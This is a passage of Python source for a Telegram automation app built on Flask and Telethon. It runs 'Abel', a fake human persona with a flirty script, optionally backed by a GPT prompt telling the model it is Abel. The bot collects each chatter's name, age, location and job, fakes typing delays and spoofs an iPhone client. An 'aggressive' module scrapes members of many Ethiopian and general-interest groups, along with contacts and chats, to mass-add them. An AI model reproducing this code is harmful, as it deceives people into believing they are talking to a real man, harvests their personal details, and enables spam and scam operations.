from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.sessions import StringSession
from telethon.errors import AuthKeyUnregisteredError, FreshResetAuthorisationForbiddenError
from telethon.events import NewMessage
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime, timedelta
import socket
import re

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Storage files
ACCOUNTS_FILE = 'accounts.json'
REPLY_SETTINGS_FILE = 'reply_settings.json'
CONVERSATION_HISTORY_FILE = 'conversation_history.json'
accounts = []
temp_sessions = {}
reply_settings = {}
conversation_history = {}
active_clients = {}
client_tasks = {}

# Helper to run async functions
def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# Load accounts
def load_accounts():
    global accounts
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    accounts = json.loads(content)
                else:
                    accounts = []
        else:
            accounts = []
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump([], f)
        logger.info(f"Loaded {len(accounts)} accounts")
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        accounts = []

# Load reply settings
def load_reply_settings():
    global reply_settings
    try:
        if os.path.exists(REPLY_SETTINGS_FILE):
            with open(REPLY_SETTINGS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    reply_settings = json.loads(content)
                else:
                    reply_settings = {}
        else:
            reply_settings = {}
            with open(REPLY_SETTINGS_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded reply settings for {len(reply_settings)} accounts")
    except Exception as e:
        logger.error(f"Error loading reply settings: {e}")
        reply_settings = {}

# Load conversation history
def load_conversation_history():
    global conversation_history
    try:
        if os.path.exists(CONVERSATION_HISTORY_FILE):
            with open(CONVERSATION_HISTORY_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    conversation_history = json.loads(content)
                else:
                    conversation_history = {}
        else:
            conversation_history = {}
            with open(CONVERSATION_HISTORY_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded conversation history")
    except Exception as e:
        logger.error(f"Error loading conversation history: {e}")
        conversation_history = {}

def save_accounts():
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving accounts: {e}")

def save_reply_settings():
    try:
        with open(REPLY_SETTINGS_FILE, 'w') as f:
            json.dump(reply_settings, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving reply settings: {e}")

def save_conversation_history():
    try:
        with open(CONVERSATION_HISTORY_FILE, 'w') as f:
            json.dump(conversation_history, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving conversation history: {e}")

def remove_invalid_account(account_id):
    global accounts
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    if len(accounts) < original_len:
        save_accounts()
        logger.info(f"Removed invalid account {account_id}")

load_accounts()
load_reply_settings()
load_conversation_history()

# ==================== AUTO REPLY SYSTEM START ====================

ABEL = {
    "name": "Abel",
    "age": 25,
    "location": "Los Angeles, USA",
    "job": "Creative Consultant & Music Producer",
    "bio": "I'm Abel – a gentleman who knows how to talk to anyone. Flirty with the ladies, cool with the fellas. I love music, travel, good coffee, and honest conversations.",
    "hobbies": ["music", "travel", "fitness", "photography", "coffee", "nightlife"],
    "languages": ["English", "Amharic", "a bit of French"],
    "style": "confident, attentive, playful but respectful",
    "emoji_frequency": 0.4,
    "question_frequency": 0.7,
    "favorite_phrases": [
        "Let's keep it real, though 😏",
        "You've got my curiosity piqued…",
        "I bet you're trouble in the best way 😄",
        "Come on, tell me more about you.",
        "I've got a feeling this conversation is going somewhere fun.",
        "Honesty – that's rare. I like that.",
        "You're different from the usual crowd, I can tell."
    ]
}

class ConversationMemory:
    def __init__(self):
        self.user_info = {}

    def get_user_info(self, chat_id):
        if chat_id not in self.user_info:
            self.user_info[chat_id] = {
                'name': None,
                'age': None,
                'gender': None,
                'location': None,
                'job': None,
                'interests': [],
                'greeting_sent': False,
                'stage': 'greet',
                'waiting_for': None,
                'asked_questions': [],
                'chat_history': []
            }
        return self.user_info[chat_id]

    def set_waiting_for(self, chat_id, what):
        info = self.get_user_info(chat_id)
        info['waiting_for'] = what

    def clear_waiting(self, chat_id):
        info = self.get_user_info(chat_id)
        info['waiting_for'] = None

    def is_waiting_for(self, chat_id):
        return self.get_user_info(chat_id).get('waiting_for')

    def add_to_history(self, chat_id, role, text):
        info = self.get_user_info(chat_id)
        info['chat_history'].append({"role": role, "text": text})
        if len(info['chat_history']) > 10:
            info['chat_history'] = info['chat_history'][-10:]

    def set_greeting_sent(self, chat_id):
        self.get_user_info(chat_id)['greeting_sent'] = True

    def has_greeted(self, chat_id):
        return self.get_user_info(chat_id).get('greeting_sent', False)

    def advance_stage(self, chat_id):
        info = self.get_user_info(chat_id)
        if not info['name']:
            info['stage'] = 'ask_name'
        elif not info['age']:
            info['stage'] = 'ask_age'
        elif not info['location']:
            info['stage'] = 'ask_location'
        elif not info['job']:
            info['stage'] = 'ask_job'
        else:
            info['stage'] = 'chat'

    def get_stage(self, chat_id):
        return self.get_user_info(chat_id).get('stage', 'greet')

    def detect_gender(self, chat_id, text, name=None):
        info = self.get_user_info(chat_id)
        if info['gender']:
            return info['gender']
        text_lower = text.lower()
        if any(p in text_lower for p in ['i am a woman', 'i am a girl', 'as a woman', 'i am female']):
            info['gender'] = 'female'; return 'female'
        if any(p in text_lower for p in ['i am a man', 'i am a guy', 'as a man', 'i am male']):
            info['gender'] = 'male'; return 'male'
        if any(p in text_lower for p in ['my husband', 'my boyfriend']):
            info['gender'] = 'female'; return 'female'
        if any(p in text_lower for p in ['my wife', 'my girlfriend']):
            info['gender'] = 'male'; return 'male'
        if name:
            name_lower = name.lower()
            female_names = {'anna','maria','sarah','linda','jessica','amanda','emma','olivia','ava','isabella',
                            'sophia','mia','charlotte','amelia','harper','evelyn','abigail','emily','elizabeth',
                            'sofia','camila','aria','scarlett','victoria','madison','luna','grace','chloe'}
            male_names = {'michael','james','john','robert','david','william','richard','joseph','thomas','charles',
                          'christopher','daniel','matthew','anthony','donald','mark','paul','steven','andrew','kenneth',
                          'joshua','kevin','brian','george','edward','ronald','timothy','jason','jeffrey','ryan'}
            if name_lower in female_names:
                info['gender'] = 'female'
                return 'female'
            if name_lower in male_names:
                info['gender'] = 'male'
                return 'male'
        return None

    def get_gender(self, chat_id):
        return self.get_user_info(chat_id).get('gender')

    def extract_name(self, text):
        if not text:
            return None
        text_clean = text.strip()
        words = text_clean.split()
        if len(words) == 1 and words[0].isalpha():
            return words[0].capitalize()
        text_lower = text_clean.lower()
        patterns = [
            r"my name is (\w+)", r"name's (\w+)", r"i'm (\w+)",
            r"i am (\w+)", r"call me (\w+)", r"it's (\w+)", r"(\w+) here"
        ]
        for p in patterns:
            match = re.search(p, text_lower)
            if match:
                name = match.group(1)
                if name.isalpha():
                    return name.capitalize()
        if text_lower in ['name', 'your name', 'what is your name']:
            return "ASKING_MY_NAME"
        return None

conversation_memory = ConversationMemory()

ABEL_REPLIES = {
    "confirm_identity": [
        "Yeah, that's me – Abel. Pleasure to meet you! 😊 And you are?",
        "Yes, I'm Abel. You got the right guy. What's your name?",
        "That's me! Now tell me your name so I can stop calling you 'you' 😉"
    ],
    "who_am_i": [
        "I'm Abel – creative consultant, music lover, and a guy who loves good conversation. Now you know that, what about you?",
        "Abel. 25, living in LA, working on music and ideas. And you?"
    ],
    "greeting_female": [
        "Well hello there… who do I have the pleasure of talking to? 😊",
        "Hi gorgeous, I'm Abel. What's your name?"
    ],
    "greeting_male": [
        "Hey man, what's good? I'm Abel.",
        "Yo! Abel here. What's happening?"
    ],
    "greeting_unknown": [
        "Hey! Abel here. Who do I have the pleasure of chatting with?",
        "Hi, I'm Abel. Curiosity got the best of me – who's this?"
    ],
    "ask_name": [
        "So what's your name?",
        "You know my name – now tell me yours 😉",
        "What should I call you?"
    ],
    "user_tells_name_female": [
        "{name}… that's a beautiful name. How old are you, {name}?",
        "{name}, I like that. Now, how many times have you circled the sun?"
    ],
    "user_tells_name_male": [
        "{name}! Good name, man. How old are you, bro?",
        "{name}, respect. How old are we talking, brother?"
    ],
    "user_tells_name_unknown": [
        "{name}, nice. How old are you, {name}?"
    ],
    "ask_age": [
        "I'm 25 – what about you?",
        "How old are you? I'm 25 myself."
    ],
    "user_tells_age": [
        "Oh {age}! That's a great age. Where are you texting from?",
        "{age}… cool. And where are you based?"
    ],
    "ask_location": [
        "I'm in Los Angeles. Where are you?",
        "I live in LA these days. What about you?"
    ],
    "user_tells_location": [
        "{location} – nice! What do you do there?",
        "Ah, {location}. Are you working or studying?"
    ],
    "ask_job": [
        "I'm a creative consultant and do music. How do you spend your days?",
        "Freelancer life here – what's your thing?"
    ],
    "user_tells_job": [
        "{job} – that's interesting! What do you enjoy doing in your free time?",
        "A {job}… I bet you've got some stories. What are you passionate about?"
    ],
    "ask_interests": [
        "What do you do for fun?",
        "Tell me a few things you're into."
    ],
    "acknowledge_interests": [
        "That's dope! I'm into music and travel myself. So, what else should I know about you?",
        "Nice taste! We've got some things in common for sure."
    ],
    "flirty": [
        "You're making me smile already… 😏",
        "I like the way you talk. It's refreshing."
    ],
    "bro_compliment": [
        "Bro, you've got good energy. I can tell.",
        "Respect, man. You seem real."
    ],
    "how_are_you": [
        "I'm genuinely good, thanks. What about you?",
        "Feeling great! And you?"
    ],
    "what_doing": [
        "Just finished some music stuff. You?",
        "I was about to make coffee. What are you up to?"
    ],
    "money_mention": [
        "Money talk already? Let's just enjoy the chat 😉",
        "I'm not into talking money. Tell me something interesting about yourself instead."
    ],
    "photo_request": [
        "A bit early for photos, don't you think? Let's talk more first.",
        "Maybe later… I'm shy 😌"
    ],
    "video_request": [
        "Whoa, slow down. Let's vibe first.",
        "Video? I'm more of a words guy for now."
    ],
    "meet": [
        "I'm down to meet cool people. What do you have in mind?",
        "Meeting up could be fun. Tell me a bit more about yourself first."
    ],
    "agree": [
        "Exactly! I like the way you think.",
        "We're on the same wavelength 🤙"
    ],
    "disagree": [
        "Alright, I respect a different opinion. Why do you say that?",
        "We don't have to agree on everything. That's what makes chatting interesting."
    ],
    "confused": [
        "I didn't quite get that. Can you say it differently?",
        "I'm a little lost – what do you mean exactly?"
    ],
    "voice_received": [
        "Can't listen to voice notes right now. Type it out?",
        "Prefer text if you don't mind 😊 What did you say?"
    ],
    "media_received": [
        "I see you sent something. What is it?",
        "Got your media. What's the story behind it?"
    ],
    "link_received": [
        "A link? What's it about?",
        "I'm careful with links… what's waiting for me there?"
    ],
    "morning": ["Good morning! Hope you slept well ☀️"],
    "night": ["Late night talks – the best kind. What's keeping you up?"],
    "afternoon": ["Afternoon! How's the day treating you?"],
    "evening": ["Evening vibes. Perfect time for a real conversation."],
    "thanks": ["Anytime! You're welcome 😊", "No need to thank me – just keep chatting!"],
    "goodbye": [
        "Don't be gone too long. I'll be here waiting 😉",
        "Alright, catch you later. It was good talking to you!"
    ],
    "default": [
        "I'd love to hear more about that. Go on…",
        "Interesting. Tell me why that matters to you.",
        "I'm all ears. What's on your mind?",
        "That's a unique thing to say. You've got my attention."
    ]
}

def detect_intent(message, chat_id):
    if not message:
        return "greeting"

    msg = message.strip().lower()
    info = conversation_memory.get_user_info(chat_id)

    # Priority 1: User is answering a pending question
    waiting_for = info.get('waiting_for')
    if waiting_for:
        return f"answering_{waiting_for}"

    # Priority 2: Direct questions about the bot
    if any(q in msg for q in ['are you abel', 'is that abel', 'abel?', 'you abel', 'am i talking to abel']):
        return "confirm_identity"
    if any(q in msg for q in ['who are you', 'who r u', 'what is your name', 'your name', 'ur name']):
        return "who_am_i"

    # Priority 3: Greetings
    if msg in ['hi','hello','hey','selam','yo','hola','howdy'] or any(g in msg for g in ['hi','hello','hey','selam','yo','hola','howdy']):
        if not info['greeting_sent']:
            return "greeting"
        else:
            return "already_greeted_again"

    # Other triggers
    if any(q in msg for q in ['how are you','how r u']):
        return "how_are_you"
    if any(q in msg for q in ['what are you doing','wyd','whats up']):
        return "what_doing"
    if any(q in msg for q in ['how old are you','your age']):
        return "how_old_am_i"
    if any(q in msg for q in ['where are you','location']):
        return "where_am_i"
    if any(q in msg for q in ['what do you do','your job']):
        return "what_is_my_job"
    if any(phrase in msg for phrase in ['my name', 'i am', "i'm", 'im', 'call me']):
        return "user_tells_name"
    if any(w in msg for w in ['sexy','hot','gorgeous','beautiful','handsome','cutie','sweetie']):
        return "flirty"
    if any(w in msg for w in ['bro','dude','man','brother']):
        return "bro_compliment"
    if any(w in msg for w in ['money','star','birr','telebirr','send me']):
        return "money_mention"
    if any(w in msg for w in ['photo','pic','picture','selfie']):
        return "photo_request"
    if any(w in msg for w in ['video','clip']):
        return "video_request"
    if any(w in msg for w in ['meet','see each other','hang out']):
        return "meet"
    if msg in ['yes','yeah','yep','ok','okay','sure']:
        return "agree"
    if msg in ['no','nope','nah']:
        return "disagree"
    if any(w in msg for w in ['thanks','thank you']):
        return "thanks"
    if any(w in msg for w in ['bye','goodbye','see you','later']):
        return "goodbye"
    if '[voice' in msg or 'voice message' in msg:
        return "voice_received"
    if '[photo' in msg or '[video' in msg:
        return "media_received"
    if 'http' in msg and '://' in msg:
        return "link_received"
    hour = datetime.now().hour
    if hour < 12:
        return "morning"
    elif hour < 18:
        return "afternoon"
    else:
        return "evening"
    return "default"

OPENAI_API_KEY = os.environ.get('OPENAI_API_KEY')

def generate_ai_response(chat_id, message_text):
    if not OPENAI_API_KEY:
        return None
    try:
        import openai
        openai.api_key = OPENAI_API_KEY
        info = conversation_memory.get_user_info(chat_id)
        gender = info.get('gender') or 'unknown'
        name = info.get('name') or 'stranger'
        history = info.get('chat_history', [])
        system_prompt = (
            f"You are Abel, a 25-year-old creative consultant and music producer from Los Angeles. "
            f"You speak English, Amharic, and a little French. "
            f"Your personality: confident, attentive, playful but respectful. "
            f"If the user is female, be charming and subtly flirty. If male, be cool and like a genuine friend. "
            f"Never ask for money, always lead the conversation naturally, ask interesting questions, "
            f"and show genuine curiosity about the person. Use light emojis occasionally. "
            f"The user's name is {name}, gender is {gender}. "
            f"Refer to previous messages to maintain context. Keep replies natural, 1-3 sentences."
        )
        messages = [{"role": "system", "content": system_prompt}]
        for h in history[-10:]:
            messages.append(h)
        messages.append({"role": "user", "content": message_text})
        response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=messages,
            temperature=0.85,
            max_tokens=150
        )
        reply = response['choices'][0]['message']['content'].strip()
        conversation_memory.add_to_history(chat_id, "user", message_text)
        conversation_memory.add_to_history(chat_id, "assistant", reply)
        return reply
    except Exception as e:
        logger.error(f"AI response failed: {e}")
        return None

def generate_rule_based_response(intent, chat_id, message_text):
    info = conversation_memory.get_user_info(chat_id)
    gender = info.get('gender')

    if intent == "confirm_identity":
        conversation_memory.set_greeting_sent(chat_id)
        conversation_memory.advance_stage(chat_id)
        return random.choice(ABEL_REPLIES["confirm_identity"])

    if intent == "who_am_i":
        return random.choice(ABEL_REPLIES["who_am_i"])

    if intent == "greeting":
        conversation_memory.set_greeting_sent(chat_id)
        conversation_memory.advance_stage(chat_id)
        if gender == 'female':
            return random.choice(ABEL_REPLIES["greeting_female"])
        elif gender == 'male':
            return random.choice(ABEL_REPLIES["greeting_male"])
        else:
            return random.choice(ABEL_REPLIES["greeting_unknown"])

    if intent == "already_greeted_again":
        stage = info['stage']
        if stage == 'ask_name':
            return random.choice(ABEL_REPLIES["ask_name"])
        elif stage == 'ask_age':
            return random.choice(ABEL_REPLIES["ask_age"])
        elif stage == 'ask_location':
            return random.choice(ABEL_REPLIES["ask_location"])
        elif stage == 'ask_job':
            return random.choice(ABEL_REPLIES["ask_job"])
        else:
            return random.choice(ABEL_REPLIES["default"])

    if intent == "answering_name":
        name = conversation_memory.extract_name(message_text)
        if name and name != "ASKING_MY_NAME":
            info['name'] = name
            conversation_memory.detect_gender(chat_id, message_text, name)
            gender = info.get('gender')
            conversation_memory.clear_waiting(chat_id)
            conversation_memory.advance_stage(chat_id)
            if gender == 'female':
                return random.choice(ABEL_REPLIES["user_tells_name_female"]).format(name=name)
            elif gender == 'male':
                return random.choice(ABEL_REPLIES["user_tells_name_male"]).format(name=name)
            else:
                return random.choice(ABEL_REPLIES["user_tells_name_unknown"]).format(name=name)
        else:
            return random.choice(ABEL_REPLIES["ask_name"])

    if intent == "answering_age":
        age_match = re.search(r'(\d+)', message_text)
        if age_match:
            info['age'] = age_match.group(1)
            conversation_memory.clear_waiting(chat_id)
            conversation_memory.advance_stage(chat_id)
            return random.choice(ABEL_REPLIES["user_tells_age"]).format(age=info['age'])
        else:
            return random.choice(ABEL_REPLIES["ask_age"])

    if intent == "answering_location":
        loc = message_text.strip().title()
        info['location'] = loc
        conversation_memory.clear_waiting(chat_id)
        conversation_memory.advance_stage(chat_id)
        return random.choice(ABEL_REPLIES["user_tells_location"]).format(location=loc)

    if intent == "answering_job":
        job = message_text.strip().title()
        info['job'] = job
        conversation_memory.clear_waiting(chat_id)
        conversation_memory.advance_stage(chat_id)
        return random.choice(ABEL_REPLIES["user_tells_job"]).format(job=job)

    if intent == "answering_interests":
        info['interests'] = [x.strip() for x in message_text.split(',') if x.strip()]
        conversation_memory.clear_waiting(chat_id)
        conversation_memory.advance_stage(chat_id)
        return random.choice(ABEL_REPLIES["acknowledge_interests"])

    if intent == "how_old_am_i":
        return f"I'm {ABEL['age']}. Now, what about you?"
    if intent == "where_am_i":
        return f"I live in {ABEL['location']}. Where are you?"
    if intent == "what_is_my_job":
        return f"I'm a {ABEL['job']}. How do you spend your days?"

    mapping = {
        "how_are_you": "how_are_you",
        "what_doing": "what_doing",
        "flirty": "flirty",
        "bro_compliment": "bro_compliment",
        "money_mention": "money_mention",
        "photo_request": "photo_request",
        "video_request": "video_request",
        "meet": "meet",
        "agree": "agree",
        "disagree": "disagree",
        "confused": "confused",
        "voice_received": "voice_received",
        "media_received": "media_received",
        "link_received": "link_received",
        "morning": "morning",
        "night": "night",
        "afternoon": "afternoon",
        "evening": "evening",
        "thanks": "thanks",
        "goodbye": "goodbye",
        "default": "default"
    }

    if intent in mapping:
        return random.choice(ABEL_REPLIES.get(mapping[intent], ABEL_REPLIES["default"]))

    return random.choice(ABEL_REPLIES["default"])

async def auto_reply_handler(event, account_id):
    try:
        if event.out:
            return
        chat = await event.get_chat()
        if (hasattr(chat, 'title') and chat.title) or \
           (hasattr(chat, 'participants_count') and chat.participants_count and chat.participants_count > 2):
            return

        chat_id = str(event.chat_id)
        message_text = event.message.text or ""

        if event.message.media:
            if hasattr(event.message.media, 'voice'):
                message_text = "[Voice Message] " + message_text
            elif hasattr(event.message.media, 'photo'):
                message_text = "[Photo] " + message_text
            elif hasattr(event.message.media, 'video'):
                message_text = "[Video] " + message_text

        account_key = str(account_id)
        if account_key not in reply_settings or not reply_settings[account_key].get('enabled', False):
            return

        conversation_memory.detect_gender(chat_id, message_text)

        response = None
        if OPENAI_API_KEY:
            response = generate_ai_response(chat_id, message_text)

        if not response:
            intent = detect_intent(message_text, chat_id)
            logger.info(f"Intent: {intent}")
            response = generate_rule_based_response(intent, chat_id, message_text)

        if not response:
            response = "Hey there! Abel here. What's on your mind? 😊"

        if not OPENAI_API_KEY and random.random() < ABEL["emoji_frequency"]:
            response += " " + random.choice(["😉","😏","😎","😊","🔥"])

        info = conversation_memory.get_user_info(chat_id)
        if not info['name']:
            conversation_memory.set_waiting_for(chat_id, "name")
        elif not info['age']:
            conversation_memory.set_waiting_for(chat_id, "age")
        elif not info['location']:
            conversation_memory.set_waiting_for(chat_id, "location")
        elif not info['job']:
            conversation_memory.set_waiting_for(chat_id, "job")
        elif not info['interests']:
            conversation_memory.set_waiting_for(chat_id, "interests")
        else:
            conversation_memory.clear_waiting(chat_id)

        delay = random.randint(15, 40)
        logger.info(f"Replying in {delay}s to {chat_id}")
        async with event.client.action(event.chat_id, 'typing'):
            await asyncio.sleep(delay)

        await event.reply(response)
        logger.info(f"Sent: {response[:80]}")

        if account_key not in conversation_history:
            conversation_history[account_key] = {}
        if chat_id not in conversation_history[account_key]:
            conversation_history[account_key][chat_id] = []
        conversation_history[account_key][chat_id].append({
            "role": "user", "text": message_text, "time": int(time.time())
        })
        conversation_history[account_key][chat_id].append({
            "role": "assistant", "text": response, "time": int(time.time())
        })
        conversation_history[account_key][chat_id] = conversation_history[account_key][chat_id][-50:]
        save_conversation_history()

    except Exception as e:
        logger.error(f"Error in auto-reply: {e}")
        try:
            await event.reply("Hey! Something glitched, but I'm still here 😊")
        except:
            pass

async def start_auto_reply_for_account(account):
    account_id = account['id']
    account_key = str(account_id)
    reconnect_count = 0

    while True:
        try:
            logger.info(f"Starting auto-reply for account {account_id} (attempt {reconnect_count + 1})")
            client = TelegramClient(
                StringSession(account['session']),
                API_ID,
                API_HASH,
                connection_retries=10,
                retry_delay=5,
                timeout=60,
                device_model="iPhone 13",
                system_version="15.0",
                app_version="8.4.1"
            )
            await client.connect()

            if not await client.is_user_authorized():
                logger.error(f"Account {account_id} not authorized")
                await asyncio.sleep(30)
                reconnect_count += 1
                continue

            active_clients[account_key] = client

            @client.on(NewMessage(incoming=True))
            async def handler(event):
                await auto_reply_handler(event, account_id)

            await client.start()
            logger.info(f"✅ Auto-reply ACTIVE for {account.get('name')} ({account.get('phone')})")
            reconnect_count = 0
            await client.run_until_disconnected()

        except Exception as e:
            logger.error(f"Connection lost for account {account_id}: {e}")
            if account_key in active_clients:
                del active_clients[account_key]
            reconnect_count += 1
            wait_time = min(30 * reconnect_count, 300)
            logger.info(f"Reconnecting in {wait_time}s...")
            await asyncio.sleep(wait_time)

def stop_auto_reply_for_account(account_id):
    account_key = str(account_id)
    if account_key in active_clients:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(active_clients[account_key].disconnect())
            loop.close()
            del active_clients[account_key]
            logger.info(f"Stopped auto-reply for account {account_key}")
        except Exception as e:
            logger.error(f"Error stopping auto-reply: {e}")

def start_auto_reply_thread():
    time.sleep(3)
    for account in accounts:
        account_key = str(account['id'])
        if account_key in reply_settings and reply_settings[account_key].get('enabled', False):
            if account_key not in active_clients:
                thread = threading.Thread(
                    target=lambda acc=account: run_async(start_auto_reply_for_account(acc)),
                    daemon=True
                )
                thread.start()
                client_tasks[account_key] = thread
                time.sleep(2)

# ==================== AUTO REPLY SYSTEM END ====================

# ==================== AUTO ADD SYSTEM START ====================

# ==================== AUTO ADD SYSTEM START ====================

auto_add_settings = {}
AUTO_ADD_FILE = 'auto_add_settings.json'
ADDED_MEMBERS_FILE = 'added_members.json'
added_members_pool = {}

def load_auto_add_settings():
    global auto_add_settings
    try:
        if os.path.exists(AUTO_ADD_FILE):
            with open(AUTO_ADD_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    auto_add_settings = json.loads(content)
                else:
                    auto_add_settings = {}
        else:
            auto_add_settings = {}
            with open(AUTO_ADD_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded auto-add settings for {len(auto_add_settings)} accounts")
    except Exception as e:
        logger.error(f"Error loading auto-add settings: {e}")
        auto_add_settings = {}

def load_added_members():
    global added_members_pool
    try:
        if os.path.exists(ADDED_MEMBERS_FILE):
            with open(ADDED_MEMBERS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    added_members_pool = json.loads(content)
                else:
                    added_members_pool = {}
        else:
            added_members_pool = {}
            with open(ADDED_MEMBERS_FILE, 'w') as f:
                json.dump({}, f)
    except Exception as e:
        logger.error(f"Error loading added members: {e}")
        added_members_pool = {}

def save_auto_add_settings():
    try:
        with open(AUTO_ADD_FILE, 'w') as f:
            json.dump(auto_add_settings, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving auto-add settings: {e}")
        return False

def save_added_members():
    try:
        with open(ADDED_MEMBERS_FILE, 'w') as f:
            json.dump(added_members_pool, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving added members: {e}")

load_auto_add_settings()
load_added_members()

DEFAULT_SOURCE_GROUPS = [
    '@ethiopian_music', '@ethiopiannews', '@ethiopian_business',
    '@addis_ababa', '@ethiopian_meme', '@ethiopian_tiktok',
    '@habesha_videos', '@ethio_music', '@ethiopian_jobs',
    '@ethiopian_dating', '@ethiopian_technology', '@ethio_fashion',
    '@ethiopia_today', '@ethiopian_beauty', '@ethiopian_food',
    '@addis_zemen', '@ethio_360', '@ethiopian_entertainment',
    '@habesha_love', '@ethiopian_wedding', '@ethio_comedy',
    '@ethiopian_sport', '@ethio_football', '@ethiopian_celebrity',
    '@telegram', '@durov', '@TelegramTips',
    '@cryptocurrency_signals', '@Crypto_News', '@Bitcoin_News',
    '@forex_signals', '@Trading_Signals', '@stock_market',
    '@movies_hd', '@Netflix_Free', '@Hollywood_Movies',
    '@Music_World', '@HipHop_Music', '@AfroBeat_Music',
    '@Football_News', '@PremierLeague', '@UEFA_Champions',
    '@Tech_News', '@Programming_Tips', '@Hacking_News',
    '@Jobs_Career', '@Freelance_Jobs', '@Online_Business',
    '@Dating_Tips', '@Relationship_Advice', '@Love_Quotes',
    '@Motivation_Quotes', '@Success_Mindset', '@Billionaire_Mindset',
    '@Funny_Videos', '@TikTok_Viral', '@Meme_World',
    '@Free_Courses', '@Udemy_Courses', '@Book_Summaries',
]

async def scrape_members_aggressively(client, source_group, limit=500):
    """Scrape members from a source group"""
    members = set()
    try:
        if not source_group.startswith('@') and not source_group.startswith('https://'):
            source_group = '@' + source_group
        elif source_group.startswith('https://t.me/'):
            source_group = '@' + source_group.replace('https://t.me/', '')
        
        entity = await client.get_entity(source_group)
        logger.info(f"🔍 Scraping {source_group} (target: {limit} members)...")
        
        count = 0
        async for user in client.iter_participants(entity, limit=limit):
            if user and user.id and not user.bot and not user.deleted:
                members.add(user.id)
                count += 1
                if count % 100 == 0:
                    logger.info(f"   Scraped {count} from {source_group}")
        
        logger.info(f"✅ Scraped {len(members)} members from {source_group}")
        return members
        
    except errors.FloodWaitError as e:
        logger.warning(f"⏳ Flood wait {e.seconds}s for {source_group}, skipping...")
        await asyncio.sleep(min(e.seconds, 60))
        return set()
    except errors.ChatAdminRequiredError:
        logger.warning(f"👑 Admin required for {source_group}, skipping...")
        return set()
    except Exception as e:
        logger.error(f"❌ Error scraping {source_group}: {e}")
        return set()

async def get_all_contacts_aggressively(client):
    """Get all contacts"""
    members = set()
    try:
        logger.info("📱 Fetching all contacts...")
        contacts = await client(functions.contacts.GetContactsRequest(0))
        for user in contacts.users:
            if user and user.id and not user.bot and not user.deleted:
                members.add(user.id)
        logger.info(f"✅ Got {len(members)} contacts")
        return members
    except Exception as e:
        logger.error(f"❌ Contacts error: {e}")
        return set()

async def get_all_dialogs_aggressively(client):
    """Get all dialogs"""
    members = set()
    try:
        logger.info("💬 Fetching all dialogs...")
        dialogs = await client.get_dialogs(limit=2000)
        for dialog in dialogs:
            if dialog.is_user and dialog.entity and dialog.entity.id:
                user = dialog.entity
                if not user.bot and not user.deleted:
                    members.add(user.id)
        logger.info(f"✅ Got {len(members)} from dialogs")
        return members
    except Exception as e:
        logger.error(f"❌ Dialogs error: {e}")
        return set()

async def discover_and_scrape_new_groups(client, already_scraped):
    """Discover and scrape new groups"""
    new_groups = set()
    try:
        logger.info("🔎 Discovering new groups...")
        search_terms = [
            'ethiopia', 'ethiopian', 'habesha', 'addis', 'ethio',
            'crypto', 'trading', 'business', 'jobs', 'dating',
            'music', 'movies', 'football', 'news', 'tech'
        ]
        for term in search_terms:
            try:
                results = await client(functions.contacts.SearchRequest(
                    q=term,
                    limit=20
                ))
                for chat in results.chats:
                    if hasattr(chat, 'participants_count') and chat.participants_count:
                        if chat.participants_count > 1000:
                            if chat.username and f'@{chat.username}' not in already_scraped:
                                new_groups.add(f'@{chat.username}')
                                logger.info(f"   Discovered: @{chat.username} ({chat.participants_count} members)")
            except:
                continue
        logger.info(f"✅ Discovered {len(new_groups)} new groups")
        return list(new_groups)
    except Exception as e:
        logger.error(f"❌ Discovery error: {e}")
        return []

async def build_massive_member_pool(client, account_id, settings):
    """Build a massive pool of members to add"""
    account_key = str(account_id)
    if account_key not in added_members_pool:
        added_members_pool[account_key] = {
            'all_scraped': [],
            'already_added': [],
            'failed_to_add': []
        }
    
    pool = added_members_pool[account_key]
    all_scraped = set(pool.get('all_scraped', []))
    already_added = set(pool.get('already_added', []))
    failed_to_add = set(pool.get('failed_to_add', []))
    
    source_groups = settings.get('source_groups', DEFAULT_SOURCE_GROUPS)
    new_members = set()
    
    logger.info("="*60)
    logger.info("🚀 STARTING AGGRESSIVE MEMBER COLLECTION")
    logger.info("="*60)
    
    scrape_limit = settings.get('scrape_limit_per_group', 500)
    
    # Scrape from source groups
    for group in source_groups:
        if not group or not group.strip():
            continue
        members = await scrape_members_aggressively(client, group, scrape_limit)
        new_members.update(members)
        await asyncio.sleep(2)
    
    # Get contacts
    if settings.get('use_contacts', True):
        contacts = await get_all_contacts_aggressively(client)
        new_members.update(contacts)
        await asyncio.sleep(1)
    
    # Get recent chats
    if settings.get('use_recent_chats', True):
        dialogs = await get_all_dialogs_aggressively(client)
        new_members.update(dialogs)
        await asyncio.sleep(1)
    
    # Discover and scrape new groups
    if settings.get('use_scraping', True):
        already_scraped_set = set(source_groups)
        new_groups = await discover_and_scrape_new_groups(client, already_scraped_set)
        for group in new_groups[:10]:
            members = await scrape_members_aggressively(client, group, 300)
